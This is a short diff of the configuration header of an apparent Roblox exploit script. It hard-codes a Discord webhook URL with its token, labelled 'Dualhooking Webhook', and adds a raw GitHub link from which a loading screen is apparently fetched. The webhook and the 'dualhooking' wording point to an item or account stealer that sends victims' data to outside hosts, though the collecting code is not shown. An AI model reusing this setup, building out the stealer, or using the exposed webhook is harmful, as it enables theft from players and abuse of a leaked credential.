@@ -1,6 +1,6 @@
 local dhuser = "MihyeGaming"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1135780890853781657/6TSRcLwDmW0rASe9JxVDECSy74zvHWQetuefntGcZ6AyuD32zyJi52cbfBw_vTlyuswa" -- Dualhooking Webhook
-local loadingraw = "LoadingScreen Raw Link" -- Put Your LoadingScreen Raw Link Here
+local loadingraw = "https://raw.githubusercontent.com/MihyeGaming/mihyeGaming/main/loading" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
